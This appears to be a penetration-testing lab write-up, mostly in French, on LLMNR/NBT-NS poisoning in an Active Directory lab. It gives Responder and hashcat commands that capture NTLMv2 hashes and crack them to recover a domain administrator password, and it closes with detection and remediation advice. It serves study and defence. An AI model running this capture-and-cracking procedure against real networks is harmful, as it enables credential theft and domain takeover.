# Llmnr nbtns poisoning

## Théorie
> Rappel bref du principe. Détail complet dans [`docs/protocols/ntlm-llmnr-nbtns.md`](../../docs/protocols/ntlm-llmnr-nbtns.md)

## Prérequis
-Accès réseau au même segment que la victime/le DC 
- Outils utilisés :  Kali avec `responder` installé
- Comptes / permissions nécessaires : Accès à une machine Windows pour déclencher une requête de résolution de nom échouée

## Étapes pratiques

### 0. Contexte : énumération anonyme bloquée
Avant cette attaque, l'énumération anonyme SMB/LDAP a été testée et refusée (`STATUS_ACCESS_DENIED`, bind LDAP anonyme rejeté) — voir `attacks/01-recon/`. Ceci justifie le besoin d'obtenir un premier identifiant via le poisoning.

### 1. Identification de l'interface réseau
```
ip a 
```
Interface retenue : `eth0` (192.168.10.250)

### 2. Lancement de Responder

```
sudo responder -I eth0
```
*(capture d'écran : `../../screenshots/02-credential-capture/01.png`)*


### 3. Trigger a name resolution request on the victim machine
On the Windows machine (cmd):

dir \partage-inexistant-test\

Windows fails DNS resolution, falls back to LLMNR/NBT-NS broadcast —
Responder intercepts and replies, capturing the NTLMv2 challenge/response.

### 4. Capture du hash NTLMv2
*(capture d'écran : `../../screenshots/02-credential-capture/02.png`)*

Responder intercepte la requête LLMNR/mDNS et capture plusieurs hashs NTLMv2 pour le compte `Administrator` (un nouveau hash à chaque tentative, car le challenge change).
## Résultat
Ce qu'on obtient à l'issue de l'attaque (hash, ticket, accès, credentials...).
Saved automatically in `/usr/share/responder/logs/`
### 5. Cassage hors ligne avec Hashcat

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 5600 hash.txt passlist.txt (mon propre liste)
hashcat -m 5600 hash.txt --show
```
*(capture d'écran : `../../screenshots/02-credential-capture/03.png`)*

## Result
Plaintext password recovered for `BOB\Administrator` — full domain
admin access obtained from a position of zero credentials, exploiting
Windows fallback name resolution behavior.

## Detection & remediation
- **Detection**: Monitor for abnormal LLMNR (UDP 5355) and NBT-NS
  (UDP 137) traffic — a Responder-like tool generates unusual response
  patterns
- **Remediation**: Disable LLMNR via GPO; disable NBT-NS via network
  adapter settings; enforce strong password policy to resist offline cracking

## References
- MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning
- https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing
